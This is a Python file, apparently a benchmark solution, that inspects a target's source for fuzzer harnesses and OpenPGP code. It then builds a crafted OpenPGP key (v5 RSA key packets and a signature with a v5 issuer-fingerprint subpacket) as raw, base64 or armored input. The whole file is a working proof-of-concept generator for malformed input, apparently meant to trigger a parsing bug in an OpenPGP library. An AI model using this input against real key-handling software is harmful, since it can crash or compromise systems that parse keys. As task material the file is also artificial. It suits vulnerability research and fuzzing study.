import os
import re
import tarfile
import base64
from typing import Iterable, Tuple, Optional


def _is_probably_text(b: bytes) -> bool:
    if not b:
        return True
    if b.count(b"\x00") > 0:
        return False
    sample = b[:4096]
    nontext = 0
    for c in sample:
        if c in (9, 10, 13):
            continue
        if 32 <= c <= 126:
            continue
        nontext += 1
    return (nontext / max(1, len(sample))) < 0.15


def _iter_source_texts_from_dir(root: str, max_file_size: int = 2 * 1024 * 1024) -> Iterable[Tuple[str, str]]:
    exts = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp",
        ".rs", ".go", ".py", ".java", ".kt",
        ".m", ".mm", ".swift",
    }
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            _, ext = os.path.splitext(fn)
            if ext.lower() not in exts:
                continue
            p = os.path.join(dirpath, fn)
            try:
                st = os.stat(p)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > max_file_size:
                continue
            try:
                with open(p, "rb") as f:
                    b = f.read()
            except OSError:
                continue
            if not _is_probably_text(b):
                continue
            try:
                txt = b.decode("utf-8", "replace")
            except Exception:
                txt = b.decode("latin1", "replace")
            yield os.path.relpath(p, root), txt


def _iter_source_texts_from_tar(tar_path: str, max_file_size: int = 2 * 1024 * 1024) -> Iterable[Tuple[str, str]]:
    exts = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp",
        ".rs", ".go", ".py", ".java", ".kt",
        ".m", ".mm", ".swift",
    }
    try:
        tf = tarfile.open(tar_path, "r:*")
    except Exception:
        return
    with tf:
        for m in tf.getmembers():
            if not m.isreg():
                continue
            name = m.name
            _, ext = os.path.splitext(name)
            if ext.lower() not in exts:
                continue
            if m.size <= 0 or m.size > max_file_size:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                b = f.read()
            except Exception:
                continue
            if not _is_probably_text(b):
                continue
            try:
                txt = b.decode("utf-8", "replace")
            except Exception:
                txt = b.decode("latin1", "replace")
            yield name, txt


def _iter_source_texts(src_path: str) -> Iterable[Tuple[str, str]]:
    if os.path.isdir(src_path):
        yield from _iter_source_texts_from_dir(src_path)
    else:
        yield from _iter_source_texts_from_tar(src_path)


def _guess_input_format(src_path: str) -> str:
    # returns: "raw", "b64", "armor"
    fuzzer_texts = []
    openpgp_texts = []
    for path, txt in _iter_source_texts(src_path):
        low = txt.lower()
        if "llvmfuzzertestoneinput" in low or "fuzz_target!" in low or "honggfuzz" in low:
            fuzzer_texts.append(low)
        if "openpgp" in low or "pgp" in low:
            openpgp_texts.append(low)

    corpus = "\n".join(fuzzer_texts if fuzzer_texts else openpgp_texts[:50])

    if not corpus:
        return "raw"

    if "begin pgp" in corpus or "public key block" in corpus or "ascii armor" in corpus or "armored" in corpus:
        return "armor"

    # Explicit format selection heuristics
    if "gnutls_openpgp_fmt_base64" in corpus or "openpgp_fmt_base64" in corpus:
        return "b64"
    if "rnp_load_save_armor" in corpus or "load_save_armor" in corpus:
        return "armor"

    # If it looks like only base64 decoding is used, choose b64
    if ("base64" in corpus) and ("openpgp" in corpus) and ("raw" not in corpus) and ("fmt_raw" not in corpus):
        return "b64"

    return "raw"


def _encode_new_len(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n < 192:
        return bytes([n])
    if n < 8384:
        n2 = n - 192
        return bytes([192 + (n2 >> 8), n2 & 0xFF])
    if n <= 0xFFFFFFFF:
        return b"\xFF" + n.to_bytes(4, "big")
    raise ValueError("length too large")


def _pkt(tag: int, body: bytes) -> bytes:
    if not (0 <= tag <= 63):
        raise ValueError("tag")
    hdr = bytes([0xC0 | tag]) + _encode_new_len(len(body))
    return hdr + body


def _mpi_from_int(x: int) -> bytes:
    if x < 0:
        raise ValueError("mpi negative")
    if x == 0:
        return b"\x00\x00"
    bl = x.bit_length()
    nbytes = (bl + 7) // 8
    data = x.to_bytes(nbytes, "big")
    return bl.to_bytes(2, "big") + data


def _mpi_from_bytes(data: bytes) -> bytes:
    d = data.lstrip(b"\x00")
    if not d:
        return b"\x00\x00"
    bl = (len(d) - 1) * 8 + (d[0].bit_length())
    return bl.to_bytes(2, "big") + d


def _build_rsa_pubkey_packet(version: int, tag: int) -> bytes:
    # Build a structurally valid RSA public key packet (Tag 6 or 14)
    created = (0).to_bytes(4, "big")
    algo = bytes([1])  # RSA Encrypt or Sign
    # 1024-bit modulus: 0x80 00..00 01 (odd, top bit set)
    n_bytes = b"\x80" + (b"\x00" * 126) + b"\x01"
    e_bytes = b"\x01\x00\x01"  # 65537
    body = bytes([version]) + created + algo + _mpi_from_bytes(n_bytes) + _mpi_from_bytes(e_bytes)
    return _pkt(tag, body)


def _build_userid_packet(uid: bytes) -> bytes:
    return _pkt(13, uid)


def _subpkt_len(n: int) -> bytes:
    # Subpacket length encoding (same as RFC 4880 for subpackets)
    if n < 192:
        return bytes([n])
    if n < 8384:
        n2 = n - 192
        return bytes([192 + (n2 >> 8), n2 & 0xFF])
    if n <= 0xFFFFFFFF:
        return b"\xFF" + n.to_bytes(4, "big")
    raise ValueError("subpacket length too large")


def _build_signature_packet_with_issuer_fpr_v5(fpr32: bytes) -> bytes:
    # Version 4 signature packet with hashed subpackets:
    # - Signature Creation Time (type 2)
    # - Issuer Fingerprint (type 33), version 5 + 32-byte fpr
    if len(fpr32) != 32:
        raise ValueError("fpr length")
    version = 4
    sig_type = 0x00
    pk_algo = 1      # RSA
    hash_algo = 8    # SHA256

    # Subpacket: creation time
    sp_ct_type = bytes([2])
    sp_ct_data = (0).to_bytes(4, "big")
    sp_ct = _subpkt_len(1 + len(sp_ct_data)) + sp_ct_type + sp_ct_data

    # Subpacket: issuer fingerprint
    sp_if_type = bytes([33])  # 0x21
    sp_if_data = bytes([5]) + fpr32
    sp_if = _subpkt_len(1 + len(sp_if_data)) + sp_if_type + sp_if_data

    hashed = sp_ct + sp_if
    unhashed = b""

    left16 = b"\x00\x00"

    # Signature MPI: 1024-bit placeholder with top bit set
    sig_mpi = _mpi_from_bytes(b"\x80" + (b"\x00" * 127))

    body = bytes([version, sig_type, pk_algo, hash_algo])
    body += len(hashed).to_bytes(2, "big") + hashed
    body += len(unhashed).to_bytes(2, "big") + unhashed
    body += left16
    body += sig_mpi
    return _pkt(2, body)


def _crc24(data: bytes) -> int:
    crc = 0xB704CE
    poly = 0x1864CFB
    for b in data:
        crc ^= (b & 0xFF) << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= poly
    return crc & 0xFFFFFF


def _armor(data: bytes, block_type: str = "PGP PUBLIC KEY BLOCK") -> bytes:
    b64 = base64.b64encode(data).decode("ascii")
    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
    crc = _crc24(data)
    crc_b64 = base64.b64encode(crc.to_bytes(3, "big")).decode("ascii")
    out = []
    out.append(f"-----BEGIN {block_type}-----\n")
    out.append("\n")
    for ln in lines:
        out.append(ln + "\n")
    out.append("=" + crc_b64 + "\n")
    out.append(f"-----END {block_type}-----\n")
    return "".join(out).encode("ascii")


def _b64_plain(data: bytes) -> bytes:
    b64 = base64.b64encode(data).decode("ascii")
    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
    return ("\n".join(lines) + "\n").encode("ascii")


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _guess_input_format(src_path)

        fpr32 = bytes(range(1, 33))
        key_v5 = _build_rsa_pubkey_packet(version=5, tag=6)
        subkey_v5 = _build_rsa_pubkey_packet(version=5, tag=14)
        uid = _build_userid_packet(b"a")
        sig = _build_signature_packet_with_issuer_fpr_v5(fpr32)

        raw = key_v5 + uid + sig + subkey_v5

        if fmt == "armor":
            return _armor(raw)
        if fmt == "b64":
            return _b64_plain(raw)
        return raw